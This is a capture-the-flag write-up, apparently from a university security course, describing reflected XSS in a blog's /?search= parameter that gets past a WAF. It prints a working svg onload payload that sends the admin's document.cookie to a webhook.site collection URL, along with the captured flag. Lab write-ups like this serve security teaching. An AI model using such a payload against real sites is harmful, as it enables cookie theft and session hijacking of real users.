# Challenge `Give me more than a simple WAF` writeup

- Vulnerability:
  - _Endpoint has a **Cross Site Scripting (XSS)** vulnerability_
- Where:
  - _`/?search=` (in the feedback) endpoint_
- Impact:
  - _Allows to **obtain the admin's cookies** by injecting malicious code in the webpage_

## Steps to reproduce

First we connected to the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22252`. We can see that the server has a search bar for blog posts. If we search for something, we can see that the search is reflected in the page, like this `/?search=`. This means that the server is probably vulnerable to **XSS**.

In this challenge we need to obtain the admin's cookie, so we need to find a way to inject code in the page that will lure the admin to perform a request to the site where we are collecting the cookies.
Since we did not have any site of our own we used a online service to collect our https requests [Webhook](https://webhook.site/). 

We noticed that there was a place where we could insert a link to report a bug or request a feature. This lead to us thinking the admin might click it to review the reports/requests. 

However this time, the code can´t be injected in the exact same way, because the server is using a **WAF** to prevent it.

With this thought in mind we sent the following payload after the `/?search=` in the feedback link:

```javascript
<svg/onload=window.open("https://webhook.site/a0e83e7e-be55-4740-8180-f38200e300ea?c="%2Bdocument.cookie)>
```
Note: The `%2B` is the url encoded version of `+`.

As soon as the admin **'clicked the link',** we received the following cookie in the http request:
```SECRET=SSof{But_I_was_told_that_this_WAF_was_all_I_needed...}```

Now, we were able to store the request in a website we control and therefore have possession of the admin's cookie obtaining the **flag**.
